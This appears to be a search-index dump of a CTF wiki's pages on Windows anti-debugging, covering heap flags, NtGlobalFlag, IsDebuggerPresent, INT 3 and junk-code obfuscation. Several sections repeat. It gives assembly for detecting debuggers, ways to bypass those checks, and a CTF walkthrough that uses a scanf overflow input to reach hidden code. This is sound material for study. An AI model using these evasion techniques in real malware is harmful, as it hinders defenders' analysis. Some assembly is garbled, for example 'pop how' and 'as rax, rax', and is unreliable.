[ebp+var_80], eax .text:004015E7 mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh .text:004015EE jmp short loc_40160A After the idiv [ebp+var_9C] trigger exception is taken over by the exception handler handled by the program, if the breakpoint is not set at the exception handler entry, the program will easily run away.","title":"Detecting VMware"},{"location":"reverse/windows/anti-debug/example/#get-flag","text":"But the whole look at it. How do you feel that there is nothing left in the flag? Have you remembered the string that was previously seen in the string window and is suspected to be the flag to be decrypted? Actually due to the limitation of IDA decompilation, Make the decompiled pseudo C code is not correct. For example, in the last paragraph of printf(&quot;But detected Debugged.\\n&quot;); here, let's look at the specific assembly code. ` asm .text:00401627 call sub_4012E0 .text:0040162C movzx eax, ax .text:0040162F mov [ebp+var_A8], eax .text:00401635 cmp [ebp+var_A8], 0 // <------ .text:0040163C jz short loc_401652 // <------ .text:0040163E push offset aButDetectedD_2 ; \"But detected Debugged.\\n\" .text:00401643 call _printf .text:00401648 add esp, 4 .text:0040164B push 1 ; int .text:0040164D call _exit ``` In fact, this code is not decompiled by IDA. The loc_401652 position is a string of code, the highlight is the use of a MessageBoxA function. And one of the function parameters is our flag to be decrypted. Then we After entering I have a pen. , in the assembly code section of the if ( !v22 ) jump, manually change it to jump to the flag decryption and pop up the messagebox part of the run, let the program help yourself. Decrypt and output, you can. The operation is as shown below: Here is the jump part after inputting I have a pen. , because the part that is normally jumped to is all part of the detection and debugging, so we jump directly to the part of the code decryption. That is the position of 00401663 . The mov-cmp-jnz above 00401663 is also a verification part, regardless of it, jump directly to mov ecx, 7 here 00401663 here to run the decryption code, and follow the MessageBoxA() Pop up message box, get flag","title":"Get flag"},{"location":"reverse/windows/anti-debug/heap-flags/","text":"About Heap flags \u00b6 Heap flags contains two flags initialized with NtGlobalFlag : Flags and ForceFlags . The values of these two fields will not only be affected by the debugger, but also by the windows version, the location of the fields. Also depends on the version of windows. Flags field: In 32-bit Windows NT, Windows 2000 and Windows XP, Flags is at the 0x0C offset of the heap. On 32-bit Windows Vista and newer systems, it is located at the offset of 0x40 . In 64-bit Windows XP, the Flags field is at the 0x14 offset of the heap, and on 64-bit Windows Vista and newer systems, it is at the 0x70 offset. ForceFlags field: In 32-bit Windows NT, Windows 2000 and Windows XP, ForceFlags is located at the 0x10 offset of the heap. On 32-bit Windows Vista and newer systems, it is located at the offset of 0x44 . In 64-bit Windows XP, the ForceFlags field is at the 0x18 offset of the heap, and on 64-bit Windows Vista and newer systems, it is at the 0x74 offset. In all versions of Windows, the value of the Flags field is normally set to HEAP_GROWABLE(2) , and the ForceFlags field is normally set to 0 . However for a 32-bit process (64-bit programs are not There will be troubles. Both of these default values depend on the [ subsystem ] of its host process ( https://msdn.microsoft.com/en-us/library/ms933120.aspx ) Version (this does not refer to the Linux subsystem such as win10). Only when subsystem is in 3.51 and higher, the default value of the field is as described above. If it is in 3.10-3.50 Between, the two fields of HEAP_CREATE_ALIGN_16 (0x10000) will be set. If the version is lower than 3.10 , then this program file will not be run at all. If an operation sets the values of the Flags and ForgeFlags fields to 2 and 0 , respectively, but does not check the subsystem version, then it can be indicated that the action is to hide the debugger. . When the debugger is present, under the Windows NT , Windows 2000 and 32-bit Windows XP systems, the Flags field will set the following flags: HEAP_GROWABLE ( 2 ) HEAP_TAIL_CHECKING_ENABLED ( 0x20 ) HEAP_FREE_CHECKING_ENABLED ( 0x40 ) HEAP_SKIP_VALIDATION_CHECKS ( 0x10000000 ) HEAP_VALIDATE_PARAMETERS_ENABLED ( 0x40000000 ) On the 64-bit Windows XP system, Windows Vista and newer system versions, the Flags field will set the following flags (less HEAP_SKIP_VALIDATION_CHECKS (0x10000000) ): HEAP_GROWABLE ( 2 ) HEAP_TAIL_CHECKING_ENABLED ( 0x20 ) HEAP_FREE_CHECKING_ENABLED ( 0x40 ) HEAP_VALIDATE_PARAMETERS_ENABLED ( 0x40000000 ) For the ForgeFlags field, the following flags are normally set: HEAP_TAIL_CHECKING_ENABLED ( 0x20 ) HEAP_FREE_CHECKING_ENABLED ( 0x40 ) HEAP_VALIDATE_PARAMETERS_ENABLED ( 0x40000000 ) Because of the relationship of the NtGlobalFlag flag, heap will also set some flag bits. If the FLG_HEAP_ENABLE_TAIL_CHECK flag is set in the NtGlobalFlag field, the HEAP_TAIL_CHECKING_ENABLED flag will be set in the heap field. If the FLG_HEAP_ENABLE_FREE_CHECK flag is set in the NtGlobalFlag field, the FLG_HEAP_ENABLE_FREE_CHECK flag will be set in the heap field. If the FLG_HEAP_VALIDATE_PARAMETERS flag is set in the NtGlobalFlag field, the HEAP_VALIDATE_PARAMETERS_ENABLED flag will be set in the heap field (the HEAP_CREATE_ALIGN_16 (0x10000) will also be set in Windows NT and Windows 2000`. Sign). heap flags is also the same as NtGlobalFlag in the previous section, but it is subject to the registry HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ <filename> Location's PageHeapFlags&quot; key control. Get the heap location \u00b6 There are several ways to know the location of the heap . One of the methods is the GetProcessHeap() function of kernel32 . Of course, you can also use the following 32-bit assembly code to detect the 32-bit environment (there are actually some shells to avoid). Use this api function to directly query PEB): mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base Or use the following 64-bit code to detect a 64-bit environment push 60 h pop rsi gs: lodsq ;Process Environment Block mov eax , [ rax + 30 h ] ;get process heap base Or use the following 32-bit code to detect a 64-bit environment mov eax , fs :[ 30 h ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov eax , [ eax + 1030 h ] ;get process heap base The other method is to use the GetProcessHeaps() function of kernel32 . In fact, it is simply transferred to the ntdll RtlGetProcessHeaps() function, which returns an array of the heap belonging to the current process. The first heap of the array is the same as the GetProcessHeap() function of kernel32 . This process can be implemented with 32-bit code detection for 32-bit windows environments: push 30 h pop how fs: lodsd ;Process Environment Block ;get process heaps list base mov how , [ how + eax + 5 ch ] lodsd As above, the code for detecting 64-bit windows environment with 64-bit code is: push 60 h pop rsi gs: lodsq ;Process Environment Block ;get process heaps list base mov esi , [ rsi * 2 + rax + 20 h ] lodsd Or use a 32-bit code to detect a 64-bit window environment: mov eax , fs :[ 30 h ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov esi , [ eax + 10 f0h ] ;get process heaps list base lodsd Detect Flags field \u00b6 So obviously, we can detect the debuggers from the flags of Flags and ForgeFlags . First look at the detection code of the Flags field, use a 32-bit code to detect the 32-bit windows environment, and the subsystem version is between 3.10-3.50 : call GetVersion cmp al , 6 cc sbb ebx , ebx and ebx , 34 h mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base mov eax , [ eax + ebx + 0 ch ] ;Flags ;neither HEAP_CREATE_ALIGN_16 ;nor HEAP_SKIP_VALIDATION_CHECKS and eax , 0 effeffffh ;HEAP_GROWABLE ;+ HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp eax , 40000062 h je being_debugged The 32-bit code detects the 32-bit windows environment, and the subsystem is 3.51 and higher: call GetVersion cmp al , 6 cc sbb ebx , ebx and ebx , 34 h mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base mov eax , [ eax + ebx + 0 ch ] ;Flags ;not HEAP_SKIP_VALIDATION_CHECKS bswap eax and al , 0 efh ;HEAP_GROWABLE ;+ HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED ;reversed by bswap cmp eax , 62000040 h je being_debugged 64-bit code detects 64-bit windows environments (64-bit processes don't have to be bothered by the subsystem version): push 60 h pop rsi gs: lodsq ;Process Environment Block mov ebx , [ rax + 30 h ] ;get process heap base call GetVersion cmp al , 6 as rax , rax and al , 0 a4h ;HEAP_GROWABLE ;+ HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp d [ rbx + rax + 70 h ], 40000062 h ;Flags je being_debugged Detect 64-bit windows environment with 32-bit code: push 30 h pop eax mov ebx , fs :[ eax ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov ah , 10 h mov ebx , [ ebx + eax ] ;get process heap base call GetVersion cmp al , 6 sbb eax , eax and al , 0 a4h ;Flags ;HEAP_GROWABLE ;+ HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp [ ebx + eax + 70 h ], 40000062 h je being_debugged If you get this value directly through the NtMajorVersion field of the KUSER_SHARED_DATA structure (located at the offset of 0x7ffe026c in 2G user space) (this value can be obtained on all 32-bit/64-bit versions of Windows), you can further confuse The GetVersion() function call operation of kernel32 . Detecting ForgeFlags field \u00b6 Of course, another method is to detect the ForgeFlags field. The following is a 32-bit code detection for a 32-bit Windows environment. The subsystem version is between 3.10-3.50 : call GetVersion cmp al , 6 cc sbb ebx , ebx and ebx , 34 h mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base mov eax , [ eax + ebx + 10 h ] ;ForceFlags ;not HEAP_CREATE_ALIGN_16 btr eax , 10 h ;HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp eax , 40000060 h je being_debugged The 32-bit code detects the 32-bit windows environment, and the subsystem is 3.51 and higher: call GetVersion cmp al , 6 cc sbb ebx , ebx and ebx , 34 h mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base ;ForceFlags ;HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp [ eax + ebx + 10 h ], 40000060 h je being_debugged 64-bit code detects 64-bit windows environments (64-bit processes don't have to be bothered by the subsystem version): push 60 h pop rsi gs: lodsq ;Process Environment Block mov ebx , [ rax + 30 h ] ;get process heap base call GetVersion cmp al , 6 as rax , rax and al , 0 a4h ;ForceFlags ;HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp d [ rbx + rax + 74 h ], 40000060 h je being_debugged Detect 64-bit windows environment with 32-bit code: call GetVersion cmp al , 6 push 30 h pop eax mov ebx , fs :[ eax ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov ah , 10 h mov ebx , [ ebx + eax ] ;get process heap base sbb eax , eax and al , 0 a4h ;ForceFlags ;HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp [ ebx + eax + 74 h ], 40000060 h je being_debugged Reference link \u00b6 The \"Ultimate\" Anti-Debugging Reference","title":"Heap Flags"},{"location":"reverse/windows/anti-debug/heap-flags/#about-heap-flags","text":"Heap flags contains two flags initialized with NtGlobalFlag : Flags and ForceFlags . The values of these two fields will not only be affected by the debugger, but also by the windows version, the location of the fields. Also depends on the version of windows. Flags field: In 32-bit Windows NT, Windows 2000 and Windows XP, Flags is at the 0x0C offset of the heap. On 32-bit Windows Vista and newer systems, it is located at the offset of 0x40 . In 64-bit Windows XP, the Flags field is at the 0x14 offset of the heap, and on 64-bit Windows Vista and newer systems, it is at the 0x70 offset. ForceFlags field: In 32-bit Windows NT, Windows 2000 and Windows XP, ForceFlags is located at the 0x10 offset of the heap. On 32-bit Windows Vista and newer systems, it is located at the offset of 0x44 . In 64-bit Windows XP, the ForceFlags field is at the 0x18 offset of the heap, and on 64-bit Windows Vista and newer systems, it is at the 0x74 offset. In all versions of Windows, the value of the Flags field is normally set to HEAP_GROWABLE(2) , and the ForceFlags field is normally set to 0 . However for a 32-bit process (64-bit programs are not There will be troubles. Both of these default values depend on the [ subsystem ] of its host process ( https://msdn.microsoft.com/en-us/library/ms933120.aspx ) Version (this does not refer to the Linux subsystem such as win10). Only when subsystem is in 3.51 and higher, the default value of the field is as described above. If it is in 3.10-3.50 Between, the two fields of HEAP_CREATE_ALIGN_16 (0x10000) will be set. If the version is lower than 3.10 , then this program file will not be run at all. If an operation sets the values of the Flags and ForgeFlags fields to 2 and 0 , respectively, but does not check the subsystem version, then it can be indicated that the action is to hide the debugger. . When the debugger is present, under the Windows NT , Windows 2000 and 32-bit Windows XP systems, the Flags field will set the following flags: HEAP_GROWABLE ( 2 ) HEAP_TAIL_CHECKING_ENABLED ( 0x20 ) HEAP_FREE_CHECKING_ENABLED ( 0x40 ) HEAP_SKIP_VALIDATION_CHECKS ( 0x10000000 ) HEAP_VALIDATE_PARAMETERS_ENABLED ( 0x40000000 ) On the 64-bit Windows XP system, Windows Vista and newer system versions, the Flags field will set the following flags (less HEAP_SKIP_VALIDATION_CHECKS (0x10000000) ): HEAP_GROWABLE ( 2 ) HEAP_TAIL_CHECKING_ENABLED ( 0x20 ) HEAP_FREE_CHECKING_ENABLED ( 0x40 ) HEAP_VALIDATE_PARAMETERS_ENABLED ( 0x40000000 ) For the ForgeFlags field, the following flags are normally set: HEAP_TAIL_CHECKING_ENABLED ( 0x20 ) HEAP_FREE_CHECKING_ENABLED ( 0x40 ) HEAP_VALIDATE_PARAMETERS_ENABLED ( 0x40000000 ) Because of the relationship of the NtGlobalFlag flag, heap will also set some flag bits. If the FLG_HEAP_ENABLE_TAIL_CHECK flag is set in the NtGlobalFlag field, the HEAP_TAIL_CHECKING_ENABLED flag will be set in the heap field. If the FLG_HEAP_ENABLE_FREE_CHECK flag is set in the NtGlobalFlag field, the FLG_HEAP_ENABLE_FREE_CHECK flag will be set in the heap field. If the FLG_HEAP_VALIDATE_PARAMETERS flag is set in the NtGlobalFlag field, the HEAP_VALIDATE_PARAMETERS_ENABLED flag will be set in the heap field (the HEAP_CREATE_ALIGN_16 (0x10000) will also be set in Windows NT and Windows 2000`. Sign). heap flags is also the same as NtGlobalFlag in the previous section, but it is subject to the registry HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ <filename> Location's PageHeapFlags&quot; key control.","title":"About Heap flags"},{"location":"reverse/windows/anti-debug/heap-flags/#get-the-heap-location","text":"There are several ways to know the location of the heap . One of the methods is the GetProcessHeap() function of kernel32 . Of course, you can also use the following 32-bit assembly code to detect the 32-bit environment (there are actually some shells to avoid). Use this api function to directly query PEB): mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base Or use the following 64-bit code to detect a 64-bit environment push 60 h pop rsi gs: lodsq ;Process Environment Block mov eax , [ rax + 30 h ] ;get process heap base Or use the following 32-bit code to detect a 64-bit environment mov eax , fs :[ 30 h ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov eax , [ eax + 1030 h ] ;get process heap base The other method is to use the GetProcessHeaps() function of kernel32 . In fact, it is simply transferred to the ntdll RtlGetProcessHeaps() function, which returns an array of the heap belonging to the current process. The first heap of the array is the same as the GetProcessHeap() function of kernel32 . This process can be implemented with 32-bit code detection for 32-bit windows environments: push 30 h pop how fs: lodsd ;Process Environment Block ;get process heaps list base mov how , [ how + eax + 5 ch ] lodsd As above, the code for detecting 64-bit windows environment with 64-bit code is: push 60 h pop rsi gs: lodsq ;Process Environment Block ;get process heaps list base mov esi , [ rsi * 2 + rax + 20 h ] lodsd Or use a 32-bit code to detect a 64-bit window environment: mov eax , fs :[ 30 h ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov esi , [ eax + 10 f0h ] ;get process heaps list base lodsd","title":"Get the heap location"},{"location":"reverse/windows/anti-debug/heap-flags/#detect-flags-field","text":"So obviously, we can detect the debuggers from the flags of Flags and ForgeFlags . First look at the detection code of the Flags field, use a 32-bit code to detect the 32-bit windows environment, and the subsystem version is between 3.10-3.50 : call GetVersion cmp al , 6 cc sbb ebx , ebx and ebx , 34 h mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base mov eax , [ eax + ebx + 0 ch ] ;Flags ;neither HEAP_CREATE_ALIGN_16 ;nor HEAP_SKIP_VALIDATION_CHECKS and eax , 0 effeffffh ;HEAP_GROWABLE ;+ HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp eax , 40000062 h je being_debugged The 32-bit code detects the 32-bit windows environment, and the subsystem is 3.51 and higher: call GetVersion cmp al , 6 cc sbb ebx , ebx and ebx , 34 h mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base mov eax , [ eax + ebx + 0 ch ] ;Flags ;not HEAP_SKIP_VALIDATION_CHECKS bswap eax and al , 0 efh ;HEAP_GROWABLE ;+ HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED ;reversed by bswap cmp eax , 62000040 h je being_debugged 64-bit code detects 64-bit windows environments (64-bit processes don't have to be bothered by the subsystem version): push 60 h pop rsi gs: lodsq ;Process Environment Block mov ebx , [ rax + 30 h ] ;get process heap base call GetVersion cmp al , 6 as rax , rax and al , 0 a4h ;HEAP_GROWABLE ;+ HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp d [ rbx + rax + 70 h ], 40000062 h ;Flags je being_debugged Detect 64-bit windows environment with 32-bit code: push 30 h pop eax mov ebx , fs :[ eax ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov ah , 10 h mov ebx , [ ebx + eax ] ;get process heap base call GetVersion cmp al , 6 sbb eax , eax and al , 0 a4h ;Flags ;HEAP_GROWABLE ;+ HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp [ ebx + eax + 70 h ], 40000062 h je being_debugged If you get this value directly through the NtMajorVersion field of the KUSER_SHARED_DATA structure (located at the offset of 0x7ffe026c in 2G user space) (this value can be obtained on all 32-bit/64-bit versions of Windows), you can further confuse The GetVersion() function call operation of kernel32 .","title":"Detect Flags field"},{"location":"reverse/windows/anti-debug/heap-flags/#detecting-forgeflags-field","text":"Of course, another method is to detect the ForgeFlags field. The following is a 32-bit code detection for a 32-bit Windows environment. The subsystem version is between 3.10-3.50 : call GetVersion cmp al , 6 cc sbb ebx , ebx and ebx , 34 h mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base mov eax , [ eax + ebx + 10 h ] ;ForceFlags ;not HEAP_CREATE_ALIGN_16 btr eax , 10 h ;HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp eax , 40000060 h je being_debugged The 32-bit code detects the 32-bit windows environment, and the subsystem is 3.51 and higher: call GetVersion cmp al , 6 cc sbb ebx , ebx and ebx , 34 h mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base ;ForceFlags ;HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp [ eax + ebx + 10 h ], 40000060 h je being_debugged 64-bit code detects 64-bit windows environments (64-bit processes don't have to be bothered by the subsystem version): push 60 h pop rsi gs: lodsq ;Process Environment Block mov ebx , [ rax + 30 h ] ;get process heap base call GetVersion cmp al , 6 as rax , rax and al , 0 a4h ;ForceFlags ;HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp d [ rbx + rax + 74 h ], 40000060 h je being_debugged Detect 64-bit windows environment with 32-bit code: call GetVersion cmp al , 6 push 30 h pop eax mov ebx , fs :[ eax ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov ah , 10 h mov ebx , [ ebx + eax ] ;get process heap base sbb eax , eax and al , 0 a4h ;ForceFlags ;HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp [ ebx + eax + 74 h ], 40000060 h je being_debugged","title":"Detecting ForgeFlags field"},{"location":"reverse/windows/anti-debug/heap-flags/#reference-link","text":"The \"Ultimate\" Anti-Debugging Reference","title":"Reference link"},{"location":"reverse/windows/anti-debug/int-3/","text":"Whenever a software interrupt exception is triggered, the exception address and the value of the EIP register will point to the next instruction that generated the exception. But the breakpoint exception is one of the special cases. When the EXCEPTION_BREAKPOINT(0x80000003) exception is triggered, Windows will assume that this is caused by a single-byte \" CC \" opcode (that is, the Int 3 instruction). Windows decrements the exception address to point to the asserted \" CC \" opcode, then pass the exception to the exception handler. But the value of the EIP register does not change. Therefore, if CD 03 is used (this is the machine code representation of Int 03 ), then when the exception handling handle accepts control, the exception address is the location pointing to 03 .","title":"Interrupt 3"},{"location":"reverse/windows/anti-debug/isdebuggerpresent/","text":"About IsDebuggerPresent \u00b6 When the debugger exists, the IsDebuggerPresent() function of kernel32 returns a non-zero value . BOOL WINAPI IsDebuggerPresent ( void ); Detection code \u00b6 Its detection method is very simple, such as using the following code (32 or 64 bits are the same code) to detect in a 32-bit/64-bit environment: ` asm call IsDebuggerPresent test al, al jne being_debugged In fact, this function simply returns the value of the `BeingDebugged` flag. The method of checking the `BeingDebugged` flag can also be implemented by examining the 32-bit environment with the following 32-bit code: `` `asm mov eax, fs:[30h] ;Process Environment Block cmp b [eax+2], 0 ;check BeingDebugged jne being_debugged Or use 64-bit code to detect 64-bit environments ` asm push 60h pop rsi gs:lodsq ;Process Environment Block cmp b [rax+2], 0 ;check BeingDebugged jne being_debugged Or use a 32-bit code to detect a 64-bit environment `` `asm mov eax, fs:[30h] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block cmp b [eax+1002h], 0 ;check BeingDebugged jne being_debugged How to bypass \u00b6 To overcome these tests, just set the BeingDebugged flag to 0 (or change the return value).","title":"IsDebuggerPresent"},{"location":"reverse/windows/anti-debug/isdebuggerpresent/#about-isdebuggerpresent","text":"When the debugger exists, the IsDebuggerPresent() function of kernel32 returns a non-zero value . BOOL WINAPI IsDebuggerPresent ( void );","title":"About IsDebuggerPresent"},{"location":"reverse/windows/anti-debug/isdebuggerpresent/#detection-code","text":"Its detection method is very simple, such as using the following code (32 or 64 bits are the same code) to detect in a 32-bit/64-bit environment: ` asm call IsDebuggerPresent test al, al jne being_debugged In fact, this function simply returns the value of the `BeingDebugged` flag. The method of checking the `BeingDebugged` flag can also be implemented by examining the 32-bit environment with the following 32-bit code: `` `asm mov eax, fs:[30h] ;Process Environment Block cmp b [eax+2], 0 ;check BeingDebugged jne being_debugged Or use 64-bit code to detect 64-bit environments ` asm push 60h pop rsi gs:lodsq ;Process Environment Block cmp b [rax+2], 0 ;check BeingDebugged jne being_debugged Or use a 32-bit code to detect a 64-bit environment `` `asm mov eax, fs:[30h] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block cmp b [eax+1002h], 0 ;check BeingDebugged jne being_debugged","title":"Detection code"},{"location":"reverse/windows/anti-debug/isdebuggerpresent/#how-to-bypass","text":"To overcome these tests, just set the BeingDebugged flag to 0 (or change the return value).","title":"How to bypass"},{"location":"reverse/windows/anti-debug/junk-code/","text":"Principle \u00b6 A flower instruction is a way to hide a block of code (or other function) that you don't want to be reverse engineered. Inserting some junk code in the real code also ensures proper execution of the original program, and the program cannot decompile well. It is difficult to understand the content of the program and achieve the effect of confusing audiovisual. Example \u00b6 Here is the second question of `See Snow.TSRC 2017CTF Fall Season'. The title download link: ctf2017_Fpc.exe The program writes several functions to confuse the audio and visual, and the key verification logic is added to prevent the static analysis of IDA. We use IDA to open the Fpc, the program will first print some prompt information, and then get the user's input. Here we use the unsafe scanf function, the user input buffer is only 0xCh long, we double-click v1 to enter the stack frame view Therefore, we can overwrite the return address by overflowing the data, and then transfer to any address to continue execution. Here I need to explain, that is, several confusing functions written before scanf are simple equations but actually have no solution. The program confuses the real verification logic, which makes IDA not very good. Decompilation. So the idea of our problem is to continue execution by overflowing to the real verification code. We can find the following data blocks not far from the code during analysis. Because IDA does not recognize the data well, we can move the cursor to the beginning of the data block and then press the C key to disassemble the data into code. It is worth noting that the location of this code is 0x00413131 , 0x41 is the 'ci' code of &#39;A&#39; , and 0x31 is the ascii code of &#39;1&#39; . Due to restrictions on snow games, users The input can only be letters and numbers, so we can also use the overflow vulnerability to execute this code. Open with OD, then set Ctrl+G to reach the breakpoint of 0x413131 . After running, enter 12345612345611A to enter, the program successfully reaches 0x00413131 . Then right-click analysis->delete analysis from the module. Identify the correct code After breaking at 0x413131 , click on the \"\"View\" in the menu bar, select &quot;RUN Track&quot; , then click on \"\"Debug\" , select \"Track Step\", and the program will record this flower. The process of instruction execution is as follows: This flower instruction is very long, but after using the OD tracking function, the execution flow of the flower instruction is very clear. A lot of jumps are made in the whole process, we just take the effective instructions and analyze it. It should be noted that in the effective instruction, we still have to satisfy some conditional jumps, so that the program can continue to execute on the correct logic. For example, jnz ctf2017_.00413B03 at 0x413420 . We are going to come back again, and set a breakpoint at 0x413420 The jump is satisfied by modifying the flag register. Continue to follow the step (after the '0041362E jnz ctf2017_.00413B03' needs to be satisfied). After the logic is correct, take the valid instruction and continue the analysis.","title":"Flower command"},{"location":"reverse/windows/anti-debug/junk-code/#principle","text":"A flower instruction is a way to hide a block of code (or other function) that you don't want to be reverse engineered. Inserting some junk code in the real code also ensures proper execution of the original program, and the program cannot decompile well. It is difficult to understand the content of the program and achieve the effect of confusing audiovisual.","title":"Principle"},{"location":"reverse/windows/anti-debug/junk-code/#example","text":"Here is the second question of `See Snow.TSRC 2017CTF Fall Season'. The title download link: ctf2017_Fpc.exe The program writes several functions to confuse the audio and visual, and the key verification logic is added to prevent the static analysis of IDA. We use IDA to open the Fpc, the program will first print some prompt information, and then get the user's input. Here we use the unsafe scanf function, the user input buffer is only 0xCh long, we double-click v1 to enter the stack frame view Therefore, we can overwrite the return address by overflowing the data, and then transfer to any address to continue execution. Here I need to explain, that is, several confusing functions written before scanf are simple equations but actually have no solution. The program confuses the real verification logic, which makes IDA not very good. Decompilation. So the idea of our problem is to continue execution by overflowing to the real verification code. We can find the following data blocks not far from the code during analysis. Because IDA does not recognize the data well, we can move the cursor to the beginning of the data block and then press the C key to disassemble the data into code. It is worth noting that the location of this code is 0x00413131 , 0x41 is the 'ci' code of &#39;A&#39; , and 0x31 is the ascii code of &#39;1&#39; . Due to restrictions on snow games, users The input can only be letters and numbers, so we can also use the overflow vulnerability to execute this code. Open with OD, then set Ctrl+G to reach the breakpoint of 0x413131 . After running, enter 12345612345611A to enter, the program successfully reaches 0x00413131 . Then right-click analysis->delete analysis from the module. Identify the correct code After breaking at 0x413131 , click on the \"\"View\" in the menu bar, select &quot;RUN Track&quot; , then click on \"\"Debug\" , select \"Track Step\", and the program will record this flower. The process of instruction execution is as follows: This flower instruction is very long, but after using the OD tracking function, the execution flow of the flower instruction is very clear. A lot of jumps are made in the whole process, we just take the effective instructions and analyze it. It should be noted that in the effective instruction, we still have to satisfy some conditional jumps, so that the program can continue to execute on the correct logic. For example, jnz ctf2017_.00413B03 at 0x413420 . We are going to come back again, and set a breakpoint at 0x413420 The jump is satisfied by modifying the flag register. Continue to follow the step (after the '0041362E jnz ctf2017_.00413B03' needs to be satisfied). After the logic is correct, take the valid instruction and continue the analysis.","title":"Example"},{"location":"reverse/windows/anti-debug/ntglobalflag/","text":"About NtGlobalFlag \u00b6 On 32-bit machines, the NtGlobalFlag field is located at the offset of PEB (process environment block) 0x68 , and the 64-bit machine is at offset '0xBC`. The default value for this field is 0. When debugging This field is set to a specific value while the device is running. Although this value does not quite indicate that a debugger is actually running, this field is often used for this purpose. This field contains a series of flag bits. The process created by the debugger sets the following flags: FLG_HEAP_ENABLE_TAIL_CHECK ( 0x10 ) FLG_HEAP_ENABLE_FREE_CHECK ( 0x20 ) FLG_HEAP_VALIDATE_PARAMETERS ( 0x40 ) Detection code \u00b6 Therefore, you can check these flags to detect the presence of the debugger. For example, use the 32-bit code below to detect on a 32-bit machine: ` asm mov eax, fs:[30h] ;Process Environment Block mov al, [eax+68h] ;NtGlobalFlag and al, 70h cmp al, 70h je being_debugged The following is the detection code for 64-bit code on a 64-bit machine: `` `asm push 60h pop rsi gs:lodsq ;Process Environment Block mov al, [rsi*2+rax-14h] ;NtGlobalFlag and al, 70h cmp al, 70h je being_debugged It should be noted that if a 32-bit program is running on a 64-bit machine, there will actually be two PEBs: one is a 32-bit part and the other is a 64-bit. The corresponding field of the 64-bit PEB will also look like Changed in 32-bit. So we have the following, using a 32-bit code to detect the 64-bit machine environment: mov eax, fs:[30h] ; Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov al, [eax+10bch] ;NtGlobalFlag and al, 70h cmp al, 70h je being_debugged Remember not to compare directly without masking other bits, so you won't be able to detect the debugger. In ExeCryptor , the NtGlobalFlag is used to detect the debugger, but the three flags of NtGlobalFlag are only when the program is created by the debugger instead of the process attached by the debugger. Will be set. Change the initial value of NtGlobalFlag \u00b6 Of course, the way to bypass this detection is also very simple, that is, the debugger wants to reset the field to 0. However, this default initial value can be changed in any of the following four ways: The value of GlobalFlag of the registry 